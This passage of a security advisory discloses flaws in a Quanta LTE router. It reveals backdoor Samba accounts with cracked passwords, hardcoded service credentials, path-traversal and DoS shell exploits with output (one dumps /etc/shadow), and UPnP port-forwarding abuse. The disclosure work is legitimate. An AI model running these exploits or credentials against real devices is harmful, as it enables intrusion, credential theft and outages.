+.text:0001B8FC                 ADD             R11, R10, R2,LSL#3
+.text:0001B900                 LDR             R8, =0xF423F
+.text:0001B904                 ADD             R9, R11, R11,LSL#2
+.text:0001B908                 SUB             R1, R0, R9,LSL#7
+.text:0001B90C                 CMP             R1, R8
+.text:0001B910                 ADDLS           R1, R1, #0xF4000
+.text:0001B914                 ADDLS           R1, R1, #0x240
+.text:0001B918                 ADD             R3, R1, R1,LSL#2
+.text:0001B91C                 MOV             R3, R3,LSL#1
+.text:0001B920                 LDR             R1, =0xCCCCCCCD
+.text:0001B924                 LDR             R5, =0xA7C5AC5
+.text:0001B928                 LDR             R6, =0x6B5FCA6B
+.text:0001B92C                 MOV             R7, R3,LSR#5
+.text:0001B930                 UMULL           R4, R7, R5, R7
+.text:0001B934                 UMULL           R9, LR, R1, R3
+.text:0001B938                 UMULL           R5, R6, R3, R6
+.text:0001B93C                 LDR             R12, =0xD1B71759
+.text:0001B940                 MOV             R6, R6,LSR#22
+.text:0001B944                 UMULL           R10, R12, R3, R12
+.text:0001B948                 MOV             LR, LR,LSR#3
+.text:0001B94C                 UMULL           R10, R9, R1, R6
+.text:0001B950                 UMULL           R8, R10, R1, LR
+.text:0001B954                 LDR             R0, =0x431BDE83
+.text:0001B958                 MOV             R12, R12,LSR#13
+.text:0001B95C                 UMULL           R11, R0, R3, R0
+.text:0001B960                 STR             R10, [SP,#0x40+var_38]
+.text:0001B964                 UMULL           R8, R10, R1, R12
+.text:0001B968                 LDR             R2, =0x51EB851F
+.text:0001B96C                 LDR             R4, =0x10624DD3
+.text:0001B970                 UMULL           R5, R2, R3, R2
+.text:0001B974                 MOV             R0, R0,LSR#18
+.text:0001B978                 STR             R10, [SP,#0x40+var_3C]
+.text:0001B97C                 UMULL           R8, R4, R3, R4
+.text:0001B980                 UMULL           R8, R10, R1, R0
+.text:0001B984                 MOV             R2, R2,LSR#5
+.text:0001B988                 MOV             R7, R7,LSR#7
+.text:0001B98C                 UMULL           R8, R11, R1, R7
+.text:0001B990                 STR             R10, [SP,#0x40+var_30]
+.text:0001B994                 MOV             R4, R4,LSR#6
+.text:0001B998                 UMULL           R8, R10, R1, R2
+.text:0001B99C                 UMULL           R8, R5, R1, R4
+.text:0001B9A0                 STR             R10, [SP,#0x40+var_2C]
+.text:0001B9A4                 MOV             R8, R9,LSR#3
+.text:0001B9A8                 MOV             R10, R11,LSR#3
+.text:0001B9AC                 ADD             R11, R10, R10,LSL#2
+.text:0001B9B0                 ADD             R9, R8, R8,LSL#2
+.text:0001B9B4                 MOV             R10, R5,LSR#3
+.text:0001B9B8                 LDR             R8, [SP,#0x40+var_38]
+.text:0001B9BC                 SUB             R6, R6, R9,LSL#1
+.text:0001B9C0                 SUB             R7, R7, R11,LSL#1
+.text:0001B9C4                 LDR             R9, [SP,#0x40+var_3C]
+.text:0001B9C8                 LDR             R11, [SP,#0x40+var_30]
+.text:0001B9CC                 ADD             R5, R10, R10,LSL#2
+.text:0001B9D0                 SUB             R5, R4, R5,LSL#1
+.text:0001B9D4                 LDR             R4, [SP,#0x40+var_2C]
+.text:0001B9D8                 MOV             R10, R8,LSR#3
+.text:0001B9DC                 MOV             R8, R9,LSR#3
+.text:0001B9E0                 MOV             R9, R11,LSR#3
+.text:0001B9E4                 ADD             R7, R7, R6
+.text:0001B9E8                 ADD             R10, R10, R10,LSL#2
+.text:0001B9EC                 ADD             R9, R9, R9,LSL#2
+.text:0001B9F0                 MOV             R11, R4,LSR#3
+.text:0001B9F4                 ADD             R8, R8, R8,LSL#2
+.text:0001B9F8                 ADD             R7, R7, R5
+.text:0001B9FC                 SUB             LR, LR, R10,LSL#1
+.text:0001BA00                 SUB             R5, R0, R9,LSL#1
+.text:0001BA04                 SUB             R8, R12, R8,LSL#1
+.text:0001BA08                 ADD             R11, R11, R11,LSL#2
+.text:0001BA0C                 ADD             R12, R7, LR
+.text:0001BA10                 SUB             R4, R2, R11,LSL#1
+.text:0001BA14                 ADD             R8, R8, R5
+.text:0001BA18                 ADD             R5, R8, R4
+.text:0001BA1C                 ADD             R0, R12, R12,LSL#1
+.text:0001BA20                 ADD             R4, R5, R0
+.text:0001BA24                 UMULL           R5, R1, R4, R1
+.text:0001BA28                 MOV             R2, R1,LSR#3
+.text:0001BA2C                 ADD             LR, R2, R2,LSL#2
+.text:0001BA30                 SUB             R8, R4, LR,LSL#1
+.text:0001BA34                 LDR             R0, =0x66666667
+.text:0001BA38                 RSB             R2, R8, #0xA
+.text:0001BA3C                 SMULL           R8, R0, R2, R0
+.text:0001BA40                 MOV             R12, R2,ASR#31
+.text:0001BA44                 RSB             R1, R12, R0,ASR#2
+.text:0001BA48                 ADD             LR, R1, R1,LSL#2
+.text:0001BA4C                 LDR             R12, =(__FUNCTION__.9079 - 0x1BA64)
+.text:0001BA50                 SUB             R4, R2, LR,LSL#1
+.text:0001BA54                 LDR             R2, =(aGet_wpspinI - 0x1BA70)
+.text:0001BA58                 ADD             R4, R4, R3
+.text:0001BA5C                 ADD             R0, PC, R12 ; "hostapd_conf_file_gen"
+.text:0001BA60                 ADD             R0, R0, #0x3C
+.text:0001BA64                 MOV             R1, #0x3D
+.text:0001BA68                 ADD             R2, PC, R2 ; "Get_WpsPin:%in"
+.text:0001BA6C                 MOV             R3, R4
+.text:0001BA70                 BL              wifi_filelog
+.text:0001BA74                 LDR             R1, =(a08lu - 0x1BA84)
+.text:0001BA78                 LDR             R0, [SP,#0x40+s] ; s
+.text:0001BA7C                 ADD             R1, PC, R1 ; "%08lu"
+.text:0001BA80                 MOV             R2, R4
+.text:0001BA84                 ADD             SP, SP, #0x1C
+.text:0001BA88                 LDMFD           SP!, {R4-R11,LR}
+.text:0001BA8C                 B               sprintf
+.text:0001BA8C ; End of function generate_wlan_wps_enrollee_pin
+</code></pre>
+<p><a id="backdoor-accounts-in-samba"></a></p>
+<h2>Details - Backdoor accounts in Samba</h2>
+<p>Samba is configured to run by default and the <code>/bin/genpasswd</code> program configures the different accounts.</p>
+<p>As seen in the IDA screenshot, multiple backdoors accounts are created:</p>
+<ul>
+<li>admin with the password 1234</li>
+<li>support with the password 1234</li>
+<li>user with the password 1234</li>
+<li>nobody with the password 1234</li>
+</ul>
+<p>From <code>/bin/genpasswd</code>:</p>
+<p><img alt="" src="images/2016-quanta-gen-password-pseudo-code.png" /></p>
+<p>The resulting file (<code>/usr/pc/samga/etc/passwd</code>) is:</p>
+<pre><code>admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh
+support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh
+user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh
+nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh
+</code></pre>
+<p>And john confirms the passwords:</p>
+<pre><code>user@kali:~$ john -show usr-pc-samba-etc-passwd 
+admin:1234:0:0:Administrator:/:/bin/sh
+support:1234:0:0:Technical Support:/:/bin/sh
+user:1234:0:0:Normal User:/:/bin/sh
+nobody:1234:0:0:nobody for ftp:/:/bin/sh
+
+4 password hashes cracked, 0 left
+user@kali:~$
+</code></pre>
+<p>When Samba starts, the passwd file is copied into <code>/var/pc/samba/etc/passwd</code>.</p>
+<p><a id="leaking-no-ip-account"></a></p>
+<h2>Details - Leaking No-IP account (?):</h2>
+<p>The file <code>/etc/inadyn-mt.conf</code> (for a dyndns client) contains an user and a hardcoded password. I don't know if it is used:</p>
+<pre><code>--log_file /usr/inadyn_srv.log
+--forced_update_period 6000
+--username alex_hung
+--password 641021
+--dyndns_system default@no-ip.com
+--alias test.no-ip.com
+</code></pre>
+<p><a id="remote-fota"></a></p>
+<h2>Details - Remote FOTA (Firmware Over The Air)</h2>
+<p>The credentials to contact the FOTA server are hardcoded in the <code>/sbin/fotad</code> binary, as shown with this IDA screenshot:</p>
+<p><img alt="" src="images/2016-quanta-sbin-fota-http-req.png" /></p>
+<p>The function sub_C8A4 contains the credentials as base64-strings, used to retrieve the firmware.</p>
+<p>It's notable the FOTA daemon tries to retrieve the firmware over HTTPS. But at the date of the writing,
+the SSL certificate for <a href="https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml">https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml</a> is invalid for 1 year.</p>
+<p><img alt="" src="images/2016-quanta-sbin-fota-http-req-auth-passwords.png" /></p>
+<p>The user/password combinaisons are:</p>
+<pre><code>qdpc:qdpc
+qdpe:qdpe
+qdp:qdp
+</code></pre>
+<p><a id="toctou-lpe"></a></p>
+<h2>Details - TOCTOU vulnerability in QCMAP_ConnectionManager - LPE</h2>
+<p>This program is started at boot as root. The function sub_131F4 creates the <code>/etc/guest_access_rules.sh</code> file, then fills it with ebtables commands, then <code>chmod 777 /etc/guest_access_rules.sh</code> (!), then executes <code>/etc/guest_access_rules.sh</code> (as root) and then removes it from the filesystem.</p>
+<p>The local admin user (without root privileges) can use this TOCTOU vulnerability to gain root privileges in the router. Chmoding 777 a file and then executing it as root doesn't seem to be a good idea.</p>
+<p>ds_system_call() is a wrapper to system().</p>
+<p>Beginning of the sub_131F4 function (<code>/etc/guest_access_rules.sh</code> is opened and ebtables are created):</p>
+<p><img alt="" src="images/2016-quanta-toctou-01.png" /></p>
+<p>End of the sub_131F4 function, where the TOCTOU vulnerability is located:</p>
+<p><img alt="" src="images/2016-quanta-toctou-02.png" /></p>
+<p>The attentive reader will comment that the program doesn't check if the file <code>/etc/guest_access_rules.sh</code> already existed and if it was owned by a non-root user before doing a fopen (file, "w"), so this user would keep the rights on the file during all the execution of the function, allowing him to add some commands into the file. He will be right to note this is not a best security practice.</p>
+<p><a id="default-wifi-password-weakness"></a></p>
+<h2>Details - Default Wifi Password Weakness</h2>
+<p>By default, Wifi password is provided as a 8-char string. It's composed of [A-Z]{8}. It's possible to bruteforce it very fast using a WPA handshake.</p>
+<p><a id="http-dos"></a></p>
+<h2>Details - HTTP DoS</h2>
+<p>By sending multiple authenticated http requests to a webservice allowing to retrieve anti-csrf tokens (security feature!), it is possible to get the qmiweb daemon (http daemon) to use 100% of CPU and to become unresponsive.
+The service doesn't check the number of requested anti-csrf tokens by the client, so it is possible to request a large number of tokens, resulting in the blocking of the HTTP server.</p>
+<p>Problematic HTTP request:</p>
+<pre><code>GET /data.ria?token=1000000000000000 HTTP/1.1
+Host: 192.168.1.1
+Cookie: qSessId=oTgVebjXWXcApoyb
+</code></pre>
+<p>PoC:</p>
+<pre><code>user@kali:~$ cat quanta-dos-http.sh 
+#!/bin/sh
+
+TMP_DIR=$(mktemp -d)
+
+echo -n "Stage [1] - Bypassing authentication ..."
+
+wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
+http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+echo " OK"
+
+echo -n "Stage [2] - DoS ..."
+http_login=$(echo $http_login | tr -d '\r')
+http_password=$(echo $http_password | tr -d '\r')
+http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
+for i in $(seq 0 10)
+do
+  wget -qO/dev/null --header="Cookie: ${http_session}hey-i-dont-think-your-parsing-of-cookies-works-well" "http://192.168.1.1/data.ria?token=100000000000000" &amp;
+done
+echo " OK"
+echo "Done. The HTTP server is surely unresponsive now."
+
+user@kali:~$ ./quanta-dos-http.sh 
+Stage [1] - Bypassing authentication ... OK
+Stage [2] - DoS ... OK
+Done. The HTTP server is surely unresponsive now.
+user@kali:~$ 
+user@kali:~$ 
+user@kali:~$ wget http://192.168.1.1
+--2015-12-04 17:04:07--  http://192.168.1.1/
+Connecting to 192.168.1.1:80... connected.
+HTTP request sent, awaiting response...
+
+^C
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-dos-http.sh">https://pierrekim.github.io/advisories/quanta-dos-http.sh</a>.</p>
+<p>In the router, the <code>/bin/qmiweb</code> program uses all the CPU.</p>
+<pre><code>Mem: 40252K used, 128664K free, 0K shrd, 20K buff, 14804K cached
+CPU: 31.2% usr 65.5% sys  0.0% nic  0.0% idle  0.0% io  0.0% irq  3.1% sirq
+Load average: 7.71 4.38 2.16 2/214 1256
+  PID  PPID USER     STAT   VSZ %MEM CPU %CPU COMMAND
+  797     1 root     S     107m 64.8   0 98.4 /bin/qmiweb
+</code></pre>
+<p><a id="arbitrary-file-browsing-using-the-http-daemon"></a></p>
+<h2>Details - Arbitrary file browsing using the http daemon</h2>
+<p>If an usb key or an usb hard disk is connected to the router, then it's possible to do arbitrary browsing using the http daemon in file system of the router using root privileges.</p>
+<p>The problem is the function in the http daemon which doesn't clean <code>../../</code> in the HTTP requests.</p>
+<p>Using the provided exploit: the exploit uses the information leak to use the login/password to get a valid cookie session and then exploits the vulnerability in the http daemon.</p>
+<p>PoC to browse the / directory of the router:</p>
+<pre><code>user@kali:~$ ./quanta-http-directory-listing.sh
+{"query_path":"/../../../../","dir_list":[
+{"name":"www","type":1,"date":"2014/12/10 02:26:44","size":0},
+{"name":"usr","type":1,"date":"1970/01/01 00:02:23","size":0},
+{"name":"config2","type":1,"date":"2016/02/24 17:26:07","size":0},
+{"name":"build.prop","type":2,"date":"2014/12/10 02:27:50","size":38},
+{"name":"sdcard","type":1,"date":"2016/01/28 18:34:47","size":0},
+{"name":"home","type":1,"date":"2016/01/30 18:55:25","size":0},
+{"name":"sbin","type":1,"date":"2014/12/10 02:27:50","size":0},
+{"name":"bin","type":1,"date":"2014/12/10 02:27:49","size":0},
+{"name":"media","type":1,"date":"2014/12/10 02:26:38","size":0},
+{"name":"boot","type":1,"date":"2014/12/10 02:15:37","size":0},
+{"name":"mnt","type":1,"date":"2014/12/10 02:26:38","size":0},
+{"name":"sys","type":1,"date":"1970/01/01 02:43:27","size":0},
+{"name":"disk","type":1,"date":"2014/12/10 02:26:38","size":0},
+{"name":"WEBSERVER","type":1,"date":"2014/12/10 02:26:39","size":0},
+{"name":"lib","type":1,"date":"2016/02/24 17:13:53","size":0},
+{"name":"dev","type":1,"date":"2016/02/24 19:43:52","size":0},
+{"name":"proc","type":1,"date":"1970/01/01 00:00:00","size":0},
+{"name":"linuxrc","type":2,"date":"2014/12/10 02:16:02","size":1906904},
+{"name":".ash_history","type":2,"date":"2016/02/24 16:44:14","size":1693},
+{"name":"tmp","type":1,"date":"2016/02/24 19:23:31","size":0},
+{"name":"etc","type":1,"date":"2016/02/24 19:23:28","size":0},
+{"name":"config","type":1,"date":"2016/02/24 19:43:52","size":0},
+{"name":"lost+found","type":1,"date":"1970/01/01 02:43:26","size":0},
+{"name":"var","type":1,"date":"2016/02/24 19:43:52","size":0},
+{"name":"cache","type":1,"date":"2016/02/24 16:43:38","size":0}]}
+user@kali:~$
+</code></pre>
+<p>Source of the exploit:</p>
+<pre><code>user@kali:~$ cat quanta-http-directory-listing.sh
+#!/bin/sh
+
+TMP_DIR=$(mktemp -d)
+
+wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
+http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+http_login=$(echo $http_login | tr -d '\r')
+http_password=$(echo $http_password | tr -d '\r')
+http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
+http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
+wget -qO- --header="Cookie: ${http_session}" "http://192.168.1.1/data.ria?CfgType=storage_status&amp;dir_path=/../../../../"
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-http-directory-listing.sh">https://pierrekim.github.io/advisories/quanta-http-directory-listing.sh</a>.</p>
+<p><a id="arbitrary-file-reading-using-the-http-daemon"></a></p>
+<h2>Details - Arbitrary file reading using the http daemon</h2>
+<p>If an usb key or an usb hard disk is connected to the router, then it's possible to do arbitrary file reading in the file system of the router using root privileges.</p>
+<p>The problem is the function in the http daemon which does clean the <code>../../</code> strings in the requests but not hex-encoded '/' (%2f) characters.</p>
+<p>Using the provided exploit: the exploit uses the information leak to use the login/password to get a valid cookie session and then exploits the vulnerability in the http daemon.</p>
+<p>PoC to retrieve the <code>/etc/shadow</code> file:</p>
+<pre><code>user@kali:~$ ./quanta-http-file.sh
+root:aRDiHrJ0OkehM:16414:0:99999:7:::
+daemon:*:16414:0:99999:7:::
+bin:*:16414:0:99999:7:::
+sys:*:16414:0:99999:7:::
+sync:*:16414:0:99999:7:::
+games:*:16414:0:99999:7:::
+man:*:16414:0:99999:7:::
+lp:*:16414:0:99999:7:::
+mail:*:16414:0:99999:7:::
+news:*:16414:0:99999:7:::
+uucp:*:16414:0:99999:7:::
+proxy:*:16414:0:99999:7:::
+www-data:*:16414:0:99999:7:::
+backup:*:16414:0:99999:7:::
+list:*:16414:0:99999:7:::
+irc:*:16414:0:99999:7:::
+gnats:*:16414:0:99999:7:::
+diag:*:16414:0:99999:7:::
+nobody:*:16414:0:99999:7:::
+messagebus:!:16414:0:99999:7:::
+avahi:!:16414:0:99999:7:::
+user@kali:~$
+</code></pre>
+<p>Source of the exploit:</p>
+<pre><code>user@kali:~$ cat quanta-http-file.sh
+#!/bin/sh
+
+TMP_DIR=$(mktemp -d)
+
+wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
+http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+http_login=$(echo $http_login | tr -d '\r')
+http_password=$(echo $http_password | tr -d '\r')
+http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
+http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
+wget -qO- --header="Cookie: ${http_session}" "http://192.168.1.1/storage_download/..%2f..%2f..%2f..%2f../etc/shadow"
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-http-file.sh">https://pierrekim.github.io/advisories/quanta-http-file.sh</a>.</p>
+<p><a id="network-eavesdropping"></a></p>
+<h2>Details - Network Eavesdropping - Interception with the gglogd program</h2>
+<p>By default, the available pcap library is not located in the good path and tcpdump doesn't work (missing lib).</p>
+<p>The <code>/bin/gglogd</code> program is interesting because it fixes the tcpdump dependencies by moving libpcap into the correct directory, as shown in IDA screenshots.</p>
+<p>Then, the <code>/bin/gglogd</code> program will log all the traffic passing through the bridge0 (wlan0+eth* : wireless and ethernet) and the LTE interface (rmnet0). The resulting interception files will be written into the flash memory, so "somebody" can retrieve the logged traffic even if the router is rebooted.</p>
+<p>Fixing tcpdump library:</p>
+<p><img alt="" src="images/2016-quanta-gglogd-pcap-fix-00.png" /></p>
+<p>Execution of tcpdump:</p>
+<p><img alt="" src="images/2016-quanta-gglogd-pcap-fix-01.png" /></p>
+<p><code>/bin/gglogd</code> is not started by default but it is suspicious that (1) this kind of the program is present in this router, (2) the program will fix the tcpdump dependencies on its own (tcpdump doesn't work by default in the firmware image) and (3) intercepting files are stored in a persistent storage. This intrigues further thoughts what the developer wanted to achieve from these settings.</p>
+<p><strong>This is not a vulnerability but an interesting fact.</strong></p>
+<p><a id="misc"></a></p>
+<h2>Details - Misc</h2>
+<p>Samba is started if a FAT32 usb disk is connected. The provided Samba version (3.0.25b) is outdated : 9 year old and is prone to =~ 28 CVEs allowing an attacker to execute arbitrary code as root. I advise users not to connect usb disks to this device, connecting an usb disks will start the samba daemons.</p>
+<p>Dropbear is outdated (v2011.54).</p>
+<p><a id="security-removed-in-upnp"></a></p>
+<h2>Details - Security removed in UPnP</h2>
+<p>UPnP allows to add firewall rules dynamically. Because of the security risks involved, generally there are restrictions in place to avoid dangerous new firewall rules from an unstrusted LAN client.</p>
+<p>Insecurity in IPnP was hype 10 years ago (in 2006). The security level of the UPNP program (miniupnp) in this router is lowered volontary as shown below and allows an attacker located in the LAN area to add Port forwarding from the Internet to other clients located in the LAN:</p>
+<p>From <code>/var/miniupnpd.conf</code>:</p>
+<pre><code>ext_ifname=rmnet0
+listening_ip=bridge0
+port=2869
+enable_natpmp=yes
+enable_upnp=yes
+bitrate_up=14000000
+bitrate_down=14000000
+secure_mode=no      # "secure" mode : when enabled, UPnP client are allowed to add mappings only to their IP.
+presentation_url=http://192.168.1.1
+system_uptime=yes
+notify_interval=30
+upnp_forward_chain=MINIUPNPD
+upnp_nat_chain=MINIUPNPD
+</code></pre>
+<p>There is no restriction about the UPnP permission rules in the configuration file, contrary to common usage in UPnP where it is advised to only allow redirection of port above 1024:</p>
+<p>Normal config file:</p>
+<pre><code># UPnP permission rules
+# (allow|deny) (external port range) ip/mask (internal port range)
+# A port range is &lt;min port&gt;-&lt;max port&gt; or &lt;port&gt; if there is only
+# one port in the range.
+# ip/mask format must be nn.nn.nn.nn/nn
+# it is advised to only allow redirection of port above 1024
+# and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
+allow 1024-65535 192.168.0.0/24 1024-65535
+deny 0-65535 0.0.0.0/0 0-65535
+</code></pre>
+<p>In the configuration of the vulnerable router where there are no permission rules, an attacker can forward everything from the WAN into the LAN.
+From example, an attacker can add a forwarding rule in order to allow traffic from the Internet to local Exchange servers, mail servers, ftp servers, http servers, database servers...
+In fact, this lack of security allows a local user to forward what they want from the Internet into the LAN as shown below with the miranda tool.</p>
+<pre><code>user@kali:~$ miranda
+upnp&gt; msearch
+
+Entering discovery mode for 'upnp:rootdevice', Ctl+C to stop...
+
+****************************************************************
+SSDP reply message from 192.168.1.1:2869
+XML file is located at http://192.168.1.1:2869/rootDesc.xml
+Device is running / UPnP/1.1 MiniUPnPd/1.8
+****************************************************************
+
+^CDiscover mode halted...
+
+upnp&gt; host list
+
+    [0] 192.168.1.1:2869
+
+upnp&gt; host get 0
+
+Requesting device and service info for 192.168.1.1:2869 (this could take a few seconds)...
+
+Host data enumeration complete!
+
+upnp&gt; host info 0
+
+xmlFile : http://192.168.1.1:2869/rootDesc.xml
+name : 192.168.1.1:2869
+proto : http://
+serverType : / UPnP/1.1 MiniUPnPd/1.8
+upnpServer : / UPnP/1.1 MiniUPnPd/1.8
+dataComplete : True
+deviceList : {}
+
+upnp&gt; host info 0 deviceList
+
+InternetGatewayDevice : {}
+WANDevice : {}
+WANConnectionDevice : {}
+
+upnp&gt; host info 0 deviceList WAN
+WANConnectionDevice   WANDevice
+
+upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection actions
+
+AddPortMapping : {}
+GetNATRSIPStatus : {}
+GetGenericPortMappingEntry : {}
+GetSpecificPortMappingEntry : {}
+ForceTermination : {}
+GetExternalIPAddress : {}
+GetConnectionTypeInfo : {}
+GetListOfPortMappings : {}
+GetStatusInfo : {}
+SetConnectionType : {}
+DeletePortMappingRange : {}
+DeletePortMapping : {}
+RequestConnection : {}
+AddAnyPortMapping : {}
+
+upnp&gt; host summary 0
+
+Host: 192.168.1.1:2869
+XML File: http://192.168.1.1:2869/rootDesc.xml
+InternetGatewayDevice
+    modelName: Quanta Mobile Router
+    UPC: 000000000000
+    modelNumber: 1
+    presentationURL: http://192.168.1.1
+    friendlyName: Quanta Mobile Router
+    fullName: urn:schemas-upnp-org:device:InternetGatewayDevice:2
+    UDN: uuid:56f610e0-0fb9-11e3-8ffd-0800200c9a66
+    modelURL: http://192.168.1.1
+    manufacturer: Quanta
+WANDevice
+    modelName: Quanta Mobile Router
+    UPC: 000000000000
+    modelNumber: Quanta Mobile Router
+    friendlyName: Quanta Mobile Router
+    fullName: urn:schemas-upnp-org:device:WANDevice:2
+    UDN: uuid:56f610e1-0fb9-11e3-8ffd-0800200c9a66
+    modelURL: http://192.168.1.1
+    manufacturer: Quanta
+WANConnectionDevice
+    modelName: Quanta Mobile Router
+    UPC: 000000000000
+    modelNumber: Quanta Mobile Router
+    friendlyName: Quanta Mobile Router
+    fullName: urn:schemas-upnp-org:device:WANConnectionDevice:2
+    UDN: uuid:56f610e2-0fb9-11e3-8ffd-0800200c9a66
+    modelURL: http://192.168.1.1
+    manufacturer: Quanta
+
+
+upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping
+
+Required argument:
+    Argument Name:  NewPortMappingDescription
+    Data Type:      string
+    Allowed Values: []
+    Set NewPortMappingDescription value to: net-to-internal-http-server
+
+Required argument:
+    Argument Name:  NewLeaseDuration
+    Data Type:      ui4
+    Allowed Values: []
+    Value Min:      0
+    Value Max:      604800
+    Set NewLeaseDuration value to: 0
+
+Required argument:
+    Argument Name:  NewInternalClient
+    Data Type:      string
+    Allowed Values: []
+    Set NewInternalClient value to: 192.168.1.101
+
+Required argument:
+    Argument Name:  NewEnabled
+    Data Type:      boolean
+    Allowed Values: []
+    Set NewEnabled value to: 1
+
+Required argument:
+    Argument Name:  NewExternalPort
+    Data Type:      ui2
+    Allowed Values: []
+    Set NewExternalPort value to: 80
+
+Required argument:
+    Argument Name:  NewRemoteHost
+    Data Type:      string
+    Allowed Values: []
+    Set NewRemoteHost value to:
+
+Required argument:
+    Argument Name:  NewProtocol
+    Data Type:      string
+    Allowed Values: ['TCP', 'UDP']
+    Set NewProtocol value to: TCP
+
+Required argument:
+    Argument Name:  NewInternalPort
+    Data Type:      ui2
+    Allowed Values: []
+    Value Min:      1
+    Value Max:      65535
+    Set NewInternalPort value to: 80
+
+upnp&gt; exit
+
+Bye!
+
+user@kali:~$
+</code></pre>
+<p>Firewall rules in the router before an attacker (with IP 192.168.1.2) uses UPnP:</p>
+<pre><code>root@homerouter:~# iptables-save | grep  UPNP
+:MINIUPNPD - [0:0]
+-A PREWAN -j MINIUPNPD
+:MINIUPNPD - [0:0]
+-A FORWARD -o bridge0 -m mark --mark 0x11 -j MINIUPNPD
+root@homerouter:~#
+</code></pre>
+<p>Firewall rules in the router after an attacker (with IP 192.168.1.2) uses UPnP:</p>
+<pre><code>root@homerouter:~# iptables-save | grep  UPNP
+:MINIUPNPD - [0:0]
+-A MINIUPNPD -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.1.101:80
+-A PREWAN -j MINIUPNPD
+:MINIUPNPD - [0:0]
+-A FORWARD -o bridge0 -m mark --mark 0x11 -j MINIUPNPD
+-A MINIUPNPD -d 192.168.1.101/32 -p tcp -m tcp --dport 80 -j ACCEPT
+root@homerouter:~#
+</code></pre>
+<p>A new firewall rule allowing traffic from the Internet to a local HTTP server (192.168.1.101) was sucessfully added.</p>
+<p><a id="undocumented-diagnostic-webpage"></a></p>
+<h2>Details - Undocumented diagnostic webpage</h2>
+<p>The webpage at <code>http://192.168.1.1/diaglogs_page.htm</code> (needs a valid session) gives new parameters to edit:</p>
+<ul>
+<li>QXDM Filter (?),</li>
+<li>Download Mode Configuration when modem crash occured,</li>
+<li>usb_factory_pid,</li>
+<li>Web Redirect(?),</li>
+<li>FOTA test Configuration,</li>
+<li>LTE modem Configuration,</li>
+<li>LTE Band Preferences Configuration,</li>
+<li>SMS Self-Registration Debug Test,</li>
+<li>Sending SMS PDU Test,</li>
+<li>Editing TR069 Configuration,</li>
+<li>WLAN (802.11b, bg, bgn)</li>
+</ul>
+<p><img alt="" src="images/2016-quanta-diaglogs_page.htm.png" /></p>
+<p>This is not a vulnerability but an interesting hidden functionality.</p>
+<h2>Personal notes</h2>
+<p>As the router has a sizable memory (168 MB), a decent CPU and good free space (235 MB) with complete toolkits installed by default (sshd, proxy (<code>/bin/tinyproxy -c /var/tproxy.conf</code>), tcpdump ...), I advise users to trash their routers because it's trivial for an attacker to use this router as an attack vector (ie: hosting a sniffing tool, LAN hacking, active MiTM tool, spamming zombie).</p>
+<p>The reader must understand that not all the vulnerabilities have been disclosed. There is a lot of interesting undisclosed findings in this router (including RCEs) and I encourage security researchers to analyze the binaries provided by the firmware (We can agree I already did my part).</p>
+<p>Given the vulnerabilities found, even if the vendor changes its mind and decides to patch the router, I don't think it is even possible as it needs major rewrites in several main components (the ASM code shows very bad security practices in several binaries).</p>
+<p>From my tests, it is possible to overwrite the firmware with a custom (backdoored) firmware. Generating a valid backdoored firmware is left as an exercise for the reader, but with all these included vulnerabilities in the default firmware, I don't think it is worth making the effort.</p>
+<p>To illustrate the precedent fact, here is the current available space in the router:</p>
+<pre><code>root@homerouter:~# df-h 
+Filesystem                Size      Used Available Use% Mounted on
+/dev/root                60.4M     36.2M     24.2M  60% /
+tmpfs                    64.0K         0     64.0K   0% /dev
+tmpfs                    82.5M         0     82.5M   0% /dev/shm
+/var                     82.5M    968.0K     81.5M   1% /var
+/dev/mtdblock24          60.4M     27.1M     33.3M  45% /usr
+/dev/mtdblock16          10.1M      1.4M      8.7M  14% /config
+/dev/mtdblock17          10.1M      1.3M      8.8M  13% /config2
